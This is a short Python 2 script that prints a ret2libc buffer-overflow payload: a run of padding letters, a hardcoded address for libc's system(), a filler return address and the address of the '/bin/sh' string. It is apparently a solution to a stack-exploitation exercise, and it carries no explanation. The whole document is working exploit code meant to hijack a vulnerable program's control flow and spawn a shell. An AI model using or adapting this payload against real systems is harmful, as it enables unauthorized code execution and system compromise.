import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ"
system = struct.pack("I", 0xf7e40950)
paddingPostSystem = "AAAA"
bin_sh = struct.pack("I", 0xf7f5f10b)
print padding+system+paddingPostSystem+bin_sh
